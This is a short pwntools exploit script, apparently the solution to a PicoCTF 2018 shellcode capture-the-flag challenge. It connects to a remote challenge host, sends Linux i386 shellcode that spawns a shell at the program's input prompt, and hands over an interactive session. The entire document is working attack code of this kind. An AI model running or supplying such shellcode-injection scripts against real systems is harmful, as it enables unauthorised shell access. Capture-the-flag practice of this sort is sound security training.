from pwn import *

#p = process('./PicoCTF_2018_shellcode')
p = remote('node4.buuoj.cn', 29524)

payload = asm(shellcraft.sh(), arch='i386', os='linux')

p.sendlineafter(b'Enter a string!\n', payload)

p.interactive()